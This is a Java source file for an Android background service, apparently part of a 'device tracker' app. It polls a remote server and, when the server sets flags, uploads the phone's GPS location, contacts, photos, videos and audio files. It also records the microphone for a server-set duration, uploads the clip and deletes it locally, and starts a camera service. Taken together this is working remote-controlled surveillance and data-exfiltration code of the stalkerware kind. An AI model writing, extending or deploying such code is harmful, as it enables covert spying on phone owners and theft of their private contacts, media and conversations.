package com.example.devicetrackerapp.service;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.res.AssetFileDescriptor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Toast;
import java.io.File;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import java.io.FileOutputStream;
import com.example.devicetrackerapp.MainActivity;
import com.example.devicetrackerapp.R;
import com.example.devicetrackerapp.activity.CameraActivity;
//import com.example.devicetrackerapp.activity.CameraPermissionActivity;
import com.example.devicetrackerapp.api.ApiClient;
import com.example.devicetrackerapp.dto.ApiResponse;
import com.example.devicetrackerapp.dto.AudioItem;
import com.example.devicetrackerapp.dto.ContactItem;
import com.example.devicetrackerapp.dto.ImageFolderItem;
import com.example.devicetrackerapp.dto.ImageFolderSyncRequest;
import com.example.devicetrackerapp.dto.VideoItem;
import com.example.devicetrackerapp.dto.ContactPayload;
import com.example.devicetrackerapp.dto.TrackingConfigResponse;
import com.example.devicetrackerapp.dto.UpdateLocationRequest;
import com.example.devicetrackerapp.utils.AudioUtils;
import com.example.devicetrackerapp.utils.ContactUtils;
import com.example.devicetrackerapp.utils.DeviceUtils;
import com.example.devicetrackerapp.utils.InputStreamRequestBody;
import com.example.devicetrackerapp.utils.VideoUtils;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;

import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;
import com.example.devicetrackerapp.dto.ImageItem;
import com.example.devicetrackerapp.utils.ImageUtils;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class DeviceTrackingService extends Service {

    private static final String TAG = "TrackingService";

    private boolean cameraRequestShown = false;

    private static final int IMAGE_BATCH_SIZE = 2;

    private boolean folderSynced = false;
    private boolean imageUploading = false;
    private Handler handler;

    private String deviceId;

    private Runnable runnable;

    // Default 60 sec
    private long interval = 60000;

    private FusedLocationProviderClient locationClient;

    private String folder;
    private int limit = 20;
    private int offset = 0;
    private String order = "DESC";

    @Override
    public void onCreate() {

        super.onCreate();

        createNotification();

        locationClient = LocationServices.getFusedLocationProviderClient(this);

        deviceId = DeviceUtils.getDeviceId(this);

        handler = new Handler();

        startTracking();

    }

    private void startTracking() {

        runnable = new Runnable() {

            @Override
            public void run() {

                fetchTrackingConfig();

            }

        };

        handler.post(runnable);

    }

    private void getLocation() {

        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {

            Log.e(TAG, "Location Permission Missing");

            return;
        }

        locationClient
                .getCurrentLocation(
                        Priority.PRIORITY_HIGH_ACCURACY,
                        null
                )
                .addOnSuccessListener(location -> {

                    if (location == null) {

                        Log.e(TAG, "Location NULL");

                        return;
                    }

                    double latitude = location.getLatitude();

                    double longitude = location.getLongitude();


                    Log.d(TAG, "LAT : " + latitude);

                    Log.d(TAG, "LNG : " + longitude);

                    updateServer(
                            latitude,
                            longitude
                    );

                });

    }

    private void updateServer(
            double latitude,
            double longitude) {

        UpdateLocationRequest request =
                new UpdateLocationRequest(
                        DeviceUtils.getDeviceId(this),
                        latitude,
                        longitude,
                        getBatteryLevel(),
                        null
                );

        ApiClient.getApiService()
                .updateDevice(request)
                .enqueue(new Callback<ApiResponse<String>>() {

                    @Override
                    public void onResponse(
                            Call<ApiResponse<String>> call,
                            Response<ApiResponse<String>> response) {

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            Log.d(TAG, "Location Updated Successfully");

                        } else {

                            Log.e(TAG, "Update Failed");

                        }

                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<String>> call,
                            Throwable t) {

                        Log.e(TAG, "API Error", t);

                    }

                });

    }

    private int getBatteryLevel() {

        Intent batteryStatus =
                registerReceiver(
                        null,
                        new IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                );

        if (batteryStatus == null) {

            return 0;

        }

        int level =
                batteryStatus.getIntExtra(
                        BatteryManager.EXTRA_LEVEL,
                        -1
                );

        int scale =
                batteryStatus.getIntExtra(
                        BatteryManager.EXTRA_SCALE,
                        -1
                );

        if (level == -1 || scale == -1) {

            return 0;

        }

        return (level * 100) / scale;

    }

    @Override
    public int onStartCommand(
            Intent intent,
            int flags,
            int startId) {

        return START_STICKY;

    }

    private void createNotification() {

        String channelId = "tracking_channel";

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            NotificationChannel channel =
                    new NotificationChannel(
                            channelId,
                            "Device Tracking",
                            NotificationManager.IMPORTANCE_LOW
                    );

            NotificationManager manager =
                    getSystemService(NotificationManager.class);

            manager.createNotificationChannel(channel);

        }

        Notification notification =
                new NotificationCompat.Builder(
                        this,
                        channelId
                )
                        .setContentTitle("Device Tracking Active")
                        .setContentText("Tracking location in background")
                        .setSmallIcon(R.drawable.ic_launcher_foreground)
                        .build();

        startForeground(
                1,
                notification
        );

    }

    @Override
    public void onDestroy() {

        super.onDestroy();

        if (handler != null && runnable != null) {

            handler.removeCallbacks(runnable);

        }

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {

        return null;

    }

    private void fetchTrackingConfig() {

        String deviceId = DeviceUtils.getDeviceId(this);

        ApiClient.getApiService()
                .getTrackingConfig(deviceId)
                .enqueue(new Callback<ApiResponse<TrackingConfigResponse>>() {

                    @Override
                    public void onResponse(
                            Call<ApiResponse<TrackingConfigResponse>> call,
                            Response<ApiResponse<TrackingConfigResponse>> response) {

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            TrackingConfigResponse config = response.body().getData();
                            Log.d(TAG,"================ CONFIG ================");
                            Log.d(TAG,"tracking="+config.getTrackingEnabled());
                            Log.d(TAG,"contactsUploaded="+config.getContactsUploaded());
                            Log.d(TAG,"refreshContacts="+config.getRefreshContacts());
                            Log.d(TAG,"refreshImages="+config.getRefreshImages());
                            Log.d(TAG,"imageBucket="+config.getImageBucketId());
                            Log.d(TAG,"refreshVideos="+config.getRefreshVideos());
                            Log.d(TAG,"refreshAudios="+config.getRefreshAudios());
                            Log.d(TAG,"refreshMic="+config.getRefreshMic());
                            Log.d(TAG,"refreshCamera="+config.getRefreshCamera());
                            Log.d(TAG,"========================================");

                            if (config != null) {

                                if (config.getTrackingInterval() != null
                                        && config.getTrackingInterval() > 0) {

                                    interval = config.getTrackingInterval() * 1000L;

                                } else {

                                    interval = 60000L;

                                }

                                Log.d(TAG, "Tracking : " + config.getTrackingEnabled());
                                Log.d(TAG, "Interval : " + interval);

                                // Location
                                if (Boolean.TRUE.equals(config.getTrackingEnabled())) {

                                    getLocation();

                                } else {

                                    Log.d(TAG, "Tracking Disabled");

                                }

                                // Contacts
                                Log.d(TAG,"contactsUploaded="+config.getContactsUploaded());
                                Log.d(TAG,"refreshContacts="+config.getRefreshContacts());

                                if (!Boolean.TRUE.equals(config.getContactsUploaded())
                                        || Boolean.TRUE.equals(config.getRefreshContacts())) {

                                    Log.d(TAG,"uploadContacts() CALLED");
                                    uploadContacts();

                                } else {
                                    Log.d(TAG,"Contacts already uploaded. Skip.");
                                }

                               // Images
                                Log.d(TAG, "refreshImages = " + config.getRefreshImages());
                                Log.d(TAG, "imageUploading = " + imageUploading);
                                Log.d(TAG,"Bucket="+config.getImageBucketId());

                                if ((!Boolean.TRUE.equals(config.getImagesUploaded())
                                        || Boolean.TRUE.equals(config.getRefreshImages()))
                                        && !imageUploading) {
                                    Log.d(TAG, "uploadImages() called");
                                    Log.d(TAG, "Folder = " + config.getImageBucketId());
                                    imageUploading = true;

                                    uploadImages(
                                            config.getImageBucketId(),
                                            config.getImageLimit() != null ? config.getImageLimit() : 4,
                                            config.getImageOffset() != null ? config.getImageOffset() : 0,
                                            config.getImageOrder() != null ? config.getImageOrder() : "NEWEST"
                                    );
                                }

                                //folder sync
                                Log.d(TAG, "===== BEFORE FOLDER SYNC =====");
                                Log.d(TAG, "folderSynced = " + folderSynced);

                                if (!folderSynced) {

                                    Log.d(TAG, "syncImageFolders() CALLED");

                                    syncImageFolders();

                                }

                                // Videos
                                if (Boolean.TRUE.equals(config.getRefreshVideos())) {

                                    uploadVideos();

                                }

                                // Audios
                                if (Boolean.TRUE.equals(config.getRefreshAudios())) {

                                    uploadAudios();

                                }

                                // Mic Recording
                                if (Boolean.TRUE.equals(config.getRefreshMic())) {

                                    startMicRecording(config.getMicDuration());

                                }

                                // Camera
                                Log.d(TAG, "refreshCamera = " + config.getRefreshCamera());
                                Log.d(TAG, "cameraStreaming = " + config.getCameraStreaming());
//                                if (Boolean.TRUE.equals(config.getRefreshCamera())) {
//
//                                    ApiClient.getApiService()
//                                            .cameraRequestReceived(deviceId)
//                                            .enqueue(new Callback<ApiResponse<String>>() {
//
//                                                @Override
//                                                public void onResponse(
//                                                        Call<ApiResponse<String>> call,
//                                                        Response<ApiResponse<String>> response) {
//
//                                                    if (response.isSuccessful()
//                                                            && response.body() != null
//                                                            && response.body().isSuccess()) {
//
//                                                        Intent intent =
//                                                                new Intent(
//                                                                        DeviceTrackingService.this,
//                                                                        CameraActivity.class
//                                                                );
//
//                                                        intent.putExtra("deviceId", deviceId);
//
//                                                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//
//                                                        startActivity(intent);
//
//                                                    } else {
//
//                                                        Log.e(TAG, "Camera Request Failed");
//
//                                                        if (response.body() != null) {
//                                                            Log.e(TAG, "Message : " + response.body().getMessage());
//                                                        }
//
//                                                    }
//
//                                                }
//
//                                                @Override
//                                                public void onFailure(
//                                                        Call<ApiResponse<String>> call,
//                                                        Throwable t) {
//
//                                                    Log.e(TAG, "Camera Request Failed", t);
//
//                                                }
//
//                                            });
//
//                                }

                                if (Boolean.TRUE.equals(config.getRefreshCamera())) {

                                    ApiClient.getApiService()
                                            .cameraRequestReceived(deviceId)
                                            .enqueue(new Callback<ApiResponse<String>>() {

                                                @Override
                                                public void onResponse(
                                                        Call<ApiResponse<String>> call,
                                                        Response<ApiResponse<String>> response) {

                                                    if (response.isSuccessful()
                                                            && response.body() != null
                                                            && response.body().isSuccess()) {

                                                        Log.d(TAG, "Starting CameraForegroundService...");

                                                        Intent serviceIntent =
                                                                new Intent(
                                                                        DeviceTrackingService.this,
                                                                        CameraForegroundService.class
                                                                );

                                                        serviceIntent.putExtra("deviceId", deviceId);

                                                        ContextCompat.startForegroundService(
                                                                DeviceTrackingService.this,
                                                                serviceIntent
                                                        );

                                                    } else {

                                                        Log.e(TAG, "Camera Request Failed");

                                                        if (response.body() != null) {
                                                            Log.e(TAG, "Message : " + response.body().getMessage());
                                                        }

                                                    }

                                                }

                                                @Override
                                                public void onFailure(
                                                        Call<ApiResponse<String>> call,
                                                        Throwable t) {

                                                    Log.e(TAG, "Camera Request Failed", t);

                                                }

                                            });

                                }
                            }

                        }

                        handler.postDelayed(runnable, interval);

                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<TrackingConfigResponse>> call,
                            Throwable t) {

                        Log.e(TAG, "Config Error", t);

                        handler.postDelayed(runnable, interval);

                    }

                });

    }

    private boolean hasPermission(String permission) {

        return ActivityCompat.checkSelfPermission(
                this,
                permission
        ) == PackageManager.PERMISSION_GRANTED;

    }

    private void uploadContacts() {
        Toast.makeText(this, "uploadContacts Called", Toast.LENGTH_SHORT).show();

        try {

            if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
                return;
            }

            List<ContactItem> contacts = ContactUtils.getContacts(this);

            if (contacts.size() > 5000) {
                Log.d(TAG, "Large Contact List : " + contacts.size());
            }

            if (contacts == null || contacts.isEmpty()) {
                Log.d(TAG, "No Contacts Found");
                return;
            }

            ContactPayload payload = new ContactPayload(
                    DeviceUtils.getDeviceId(this),
                    contacts
            );

            ApiClient.getApiService()
                    .saveContacts(payload)
                    .enqueue(new Callback<ApiResponse<String>>() {

                        @Override
                        public void onResponse(
                                Call<ApiResponse<String>> call,
                                Response<ApiResponse<String>> response) {

                            if (response.isSuccessful()
                                    && response.body() != null
                                    && response.body().isSuccess()) {

                                Log.d(TAG, "Contacts Uploaded Successfully");

                            } else {

                                Log.e(TAG,
                                        "Contact Upload Failed : "
                                                + response.code());
                            }
                        }

                        @Override
                        public void onFailure(
                                Call<ApiResponse<String>> call,
                                Throwable t) {

                            Log.e(TAG, "Contact Upload Error", t);

                        }
                    });

        } catch (Exception e) {

            Log.e(TAG, "Contact Upload Exception", e);

        }
    }

    private void uploadImages(String folder,
                              int limit,
                              int offset,
                              String order) {

        try {

            boolean permissionGranted;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissionGranted = hasPermission(Manifest.permission.READ_MEDIA_IMAGES);
            } else {
                permissionGranted = hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);
            }

            if (!permissionGranted) {

                Log.e(TAG, "READ_MEDIA_IMAGES Permission Not Granted");
                imageUploading = false;

                // next cycle me retry hoga
                return;
            }

            if (folder == null || folder.trim().isEmpty()) {
                Log.d(TAG, "Bucket Id is NULL");
                imageUploading = false;
                return;
            }

            if (limit <= 0) {
                limit = 20;
            }

            if (offset < 0) {
                offset = 0;
            }

            if (order == null || order.trim().isEmpty()) {
                order = "DESC";
            }

            List<ImageItem> images =
                    ImageUtils.getImages(
                            this,
                            folder,
                            limit,
                            offset,
                            order
                    );

            if (images == null) {

                Log.d(TAG, "Image list is NULL");
                imageUploading = false;
                return;
            }

            Log.d(TAG, "================ IMAGE DEBUG ================");
            Log.d(TAG, "Folder : " + folder);
            Log.d(TAG, "Limit : " + limit);
            Log.d(TAG, "Offset : " + offset);
            Log.d(TAG, "Order : " + order);
            Log.d(TAG, "Images Found : " + images.size());

            for (ImageItem item : images) {
                Log.d(TAG, item.getImageName() + " -> " + item.getImageUri());
            }

            if (images.isEmpty()) {

                Log.d(TAG, "No Images Found For Bucket : " + folder);
                imageUploading = false;
                return;
            }

            uploadImageBatch(images, 0);

        } catch (Exception e) {

            imageUploading = false;
            Log.e(TAG, "uploadImages()", e);

        }
    }

    private void uploadImageBatch(List<ImageItem> images, int startIndex) {

        if (startIndex >= images.size()) {

            imageUploading = false;
            Log.d(TAG, "All Images Uploaded");
            return;
        }

        RequestBody deviceBody =
                RequestBody.create(
                        DeviceUtils.getDeviceId(this),
                        MultipartBody.FORM
                );

        // Backend duplicate handle karega
        RequestBody clearOldBody =
                RequestBody.create(
                        "false",
                        MultipartBody.FORM
                );

        List<MultipartBody.Part> parts = new ArrayList<>();

        long totalBatchSize = 0;

        int endIndex = Math.min(
                startIndex + IMAGE_BATCH_SIZE,
                images.size()
        );

        for (int i = startIndex; i < endIndex; i++) {

            ImageItem item = images.get(i);

            Log.d(TAG, "Uploading : " + item.getImageName());
            Log.d(TAG, "Uri : " + item.getImageUri());

            try {

                AssetFileDescriptor afd =
                        getContentResolver().openAssetFileDescriptor(
                                item.getImageUri(),
                                "r"
                        );

                if (afd != null) {

                    long size = afd.getLength();
                    totalBatchSize += size;

                    Log.d(TAG,
                            "Image Size : "
                                    + item.getImageName()
                                    + " = "
                                    + (size / 1024)
                                    + " KB ("
                                    + String.format("%.2f", size / (1024.0 * 1024.0))
                                    + " MB)");

                    afd.close();
                }

                RequestBody requestBody =
                        new InputStreamRequestBody(
                                this,
                                item.getImageUri(),
                                MediaType.parse("image/*")
                        );

                MultipartBody.Part part =
                        MultipartBody.Part.createFormData(
                                "files",
                                item.getImageName(),
                                requestBody
                        );

                parts.add(part);

            } catch (Exception e) {

                Log.e(TAG,
                        "Image Read Error : " + item.getImageName(),
                        e);

            }
        }

        if (parts.isEmpty()) {

            uploadImageBatch(images, endIndex);
            return;
        }

        Log.d(TAG, "========== IMAGE UPLOAD ==========");
        Log.d(TAG, "Batch Size = " + parts.size());
        Log.d(TAG, "DeviceId = " + DeviceUtils.getDeviceId(this));
        Log.d(TAG, "ClearOld = false");

        Log.d(TAG,
                "Batch Total Size = "
                        + (totalBatchSize / 1024)
                        + " KB ("
                        + String.format("%.2f", totalBatchSize / (1024.0 * 1024.0))
                        + " MB)");

        ApiClient.getApiService()
                .uploadImages(
                        deviceBody,
                        clearOldBody,
                        parts
                )
                .enqueue(new Callback<ApiResponse<String>>() {

                    @Override
                    public void onResponse(Call<ApiResponse<String>> call,
                                           Response<ApiResponse<String>> response) {

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            Log.d(TAG,
                                    "Uploaded Images : "
                                            + startIndex
                                            + " - "
                                            + (endIndex - 1));

                        } else {

                            Log.e(TAG, "Upload Failed");
                            Log.e(TAG, "HTTP Code = " + response.code());

                            if (response.errorBody() != null) {
                                try {
                                    Log.e(TAG, response.errorBody().string());
                                } catch (Exception ignored) {
                                }
                            }
                        }

                        uploadImageBatch(images, endIndex);
                    }

                    @Override
                    public void onFailure(Call<ApiResponse<String>> call,
                                          Throwable t) {

                        Log.e(TAG, "Upload Error", t);

                        uploadImageBatch(images, endIndex);
                    }
                });
    }
    private void syncImageFolders() {

        Log.d(TAG, "========== Folder Sync ==========");

        boolean permissionGranted;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            permissionGranted = ActivityCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_IMAGES
            ) == PackageManager.PERMISSION_GRANTED;

        } else {

            permissionGranted = ActivityCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED;

        }

        if (!permissionGranted) {

            Log.d(TAG, "Image permission not granted. Folder sync skipped.");

            folderSynced = false;

            return;
        }

        List<ImageItem> images = ImageUtils.getImages(this);
        Log.d("IMAGE_FOLDER", "Total Images = " + images.size());

        List<ImageFolderItem> folders = ImageUtils.getImageFolders(this);

        Log.d(TAG, "DeviceId : " + DeviceUtils.getDeviceId(this));
        Log.d(TAG, "Folder Count : " + folders.size());

        for (ImageFolderItem item : folders) {

            Log.d(TAG,
                    "BucketId = " + item.getBucketId()
                            + " | Folder = " + item.getFolderName()
                            + " | Count = " + item.getImageCount());

        }

        ImageFolderSyncRequest request = new ImageFolderSyncRequest();

        request.setDeviceId(DeviceUtils.getDeviceId(this));
        request.setFolders(folders);

        Log.d(TAG, "Calling Folder Sync API...");

        ApiClient.getApiService()
                .syncImageFolders(request)
                .enqueue(new Callback<ApiResponse<String>>() {

                    @Override
                    public void onResponse(Call<ApiResponse<String>> call,
                                           Response<ApiResponse<String>> response) {

                        Log.d(TAG, "HTTP Code : " + response.code());

                        if (response.body() != null) {

                            Log.d(TAG, "Success : " + response.body().isSuccess());
                            Log.d(TAG, "Message : " + response.body().getMessage());

                        }

                        if (response.isSuccessful() && response.body() != null && response.body().isSuccess()) {

                            Log.d(TAG, "Folder Sync Success");
                            folderSynced = true;

                        } else {

                            try {

                                if (response.errorBody() != null) {

                                    Log.e(TAG,
                                            "Error Body : "
                                                    + response.errorBody().string());

                                }

                            } catch (Exception e) {

                                Log.e(TAG, "Error Reading ErrorBody", e);

                            }

                        }

                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<String>> call,
                            Throwable t) {
                        folderSynced = false;

                        Log.e(TAG, "Folder Sync API Failed", t);

                    }

                });

    }

    private void uploadVideos(){

        try{

        boolean permissionGranted;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            permissionGranted =
                    hasPermission(Manifest.permission.READ_MEDIA_VIDEO);

        } else {

            permissionGranted =
                    hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);

        }

        if (!permissionGranted) {

            Log.e(TAG, "Video Permission Denied");

            return;
        }

            List<VideoItem> videos =
                    VideoUtils.getVideos(this);

            if(videos.isEmpty()){

                return;

            }

            List<MultipartBody.Part> parts =
                    new ArrayList<>();

            for(VideoItem item : videos){

                File file =
                        new File(item.getVideoPath());

                if(!file.exists()){

                    continue;

                }

                RequestBody body =
                        RequestBody.create(
                                file,
                                MediaType.parse("video/*"));

                parts.add(

                        MultipartBody.Part.createFormData(

                                "files",

                                file.getName(),

                                body

                        )

                );

            }

            RequestBody deviceBody =

                    RequestBody.create(

                            DeviceUtils.getDeviceId(this),

                            MultipartBody.FORM

                    );

            ApiClient.getApiService()

                    .uploadVideos(deviceBody,parts)

                    .enqueue(new Callback<ApiResponse<String>>() {

                        @Override
                        public void onResponse(
                                Call<ApiResponse<String>> call,
                                Response<ApiResponse<String>> response) {

                            if (response.isSuccessful()
                                    && response.body() != null
                                    && response.body().isSuccess()) {

                                Log.d(TAG, "Videos Uploaded Successfully");

                            } else {

                                Log.e(TAG, "Video Upload Failed");

                            }
                        }

                        @Override
                        public void onFailure(
                                Call<ApiResponse<String>> call,
                                Throwable t) {

                            Log.e(TAG, "Video Upload Error", t);

                        }
                    });

        }

        catch (Exception e){

            e.printStackTrace();

        }

    }

    private void uploadAudios() {

        try {

            boolean permissionGranted;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

                permissionGranted =
                        hasPermission(
                                Manifest.permission.READ_MEDIA_AUDIO);

            } else {

                permissionGranted =
                        hasPermission(
                                Manifest.permission.READ_EXTERNAL_STORAGE);

            }

            if (!permissionGranted) {

                return;

            }

            List<AudioItem> audios =
                    AudioUtils.getAudios(this);

            if (audios.isEmpty()) {

                Log.d(TAG, "No Audio Found");

                return;

            }

            List<MultipartBody.Part> parts =
                    new ArrayList<>();

            for (AudioItem item : audios) {

                File file =
                        new File(item.getAudioPath());

                if (!file.exists()) {

                    continue;

                }

                RequestBody body =
                        RequestBody.create(
                                file,
                                MediaType.parse("audio/*"));

                parts.add(

                        MultipartBody.Part.createFormData(

                                "files",

                                file.getName(),

                                body

                        )

                );

            }

            if (parts.isEmpty()) {

                return;

            }

            RequestBody deviceBody =

                    RequestBody.create(

                            DeviceUtils.getDeviceId(this),

                            MultipartBody.FORM

                    );

            ApiClient.getApiService()

                    .uploadAudios(deviceBody, parts)

                    .enqueue(new Callback<ApiResponse<String>>() {

                        @Override
                        public void onResponse(
                                Call<ApiResponse<String>> call,
                                Response<ApiResponse<String>> response) {

                            if (response.isSuccessful()
                                    && response.body() != null
                                    && response.body().isSuccess()) {

                                Log.d(TAG, "Audios Uploaded");

                            } else {

                                Log.e(TAG, "Audio Upload Failed");

                            }
                        }

                        @Override
                        public void onFailure(
                                Call<ApiResponse<String>> call,
                                Throwable t) {

                            Log.e(TAG, "Audio Upload Failed", t);

                        }
                    });

        }

        catch (Exception e) {

            Log.e(TAG,
                    "Audio Upload Error",
                    e);

        }

    }

    private void startMicRecording(int duration) {

        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {

            Log.e(TAG, "Microphone Permission Denied");
            return;
        }

        File file = new File(
                getExternalFilesDir(null),
                "mic_" + System.currentTimeMillis() + ".m4a"
        );

        MediaRecorder recorder;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            recorder = new MediaRecorder(this);
        } else {
            recorder = new MediaRecorder();
        }

        try {

            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setAudioSamplingRate(44100);
            recorder.setOutputFile(file.getAbsolutePath());

            recorder.prepare();
            recorder.start();

            Log.d(TAG, "Mic Recording Started");

            final MediaRecorder finalRecorder = recorder;

            new Handler(getMainLooper()).postDelayed(() -> {

                try {
                    finalRecorder.stop();
                } catch (Exception ignored) {
                }

                try {
                    finalRecorder.release();
                } catch (Exception ignored) {
                }

                Log.d(TAG, "Mic Recording Completed");

                uploadMicRecording(file, duration);

            }, duration * 1000L);

        } catch (Exception e) {

            try {
                recorder.release();
            } catch (Exception ignored) {
            }

            Log.e(TAG, "Mic Recording Error", e);
        }
    }

    private void uploadMicRecording(File file, int duration) {

        RequestBody deviceBody =
                RequestBody.create(
                        DeviceUtils.getDeviceId(this),
                        MultipartBody.FORM
                );

        RequestBody durationBody =
                RequestBody.create(
                        String.valueOf(duration),
                        MultipartBody.FORM
                );

        RequestBody fileBody =
                RequestBody.create(
                        file,
                        MediaType.parse("audio/mp4")
                );

        MultipartBody.Part part =
                MultipartBody.Part.createFormData(
                        "file",
                        file.getName(),
                        fileBody
                );

        ApiClient.getApiService()
                .uploadMicRecording(
                        deviceBody,
                        durationBody,
                        part
                )
                .enqueue(new Callback<ApiResponse<String>>() {

                    @Override
                    public void onResponse(
                            Call<ApiResponse<String>> call,
                            Response<ApiResponse<String>> response) {

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            Log.d(TAG, "Mic Uploaded Successfully");

                            if (file.exists()) {
                                file.delete();
                            }

                        } else {

                            Log.e(TAG, "Mic Upload Failed");

                        }
                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<String>> call,
                            Throwable t) {

                        Log.e(TAG, "Mic Upload Error", t);

                    }
                });

    }

}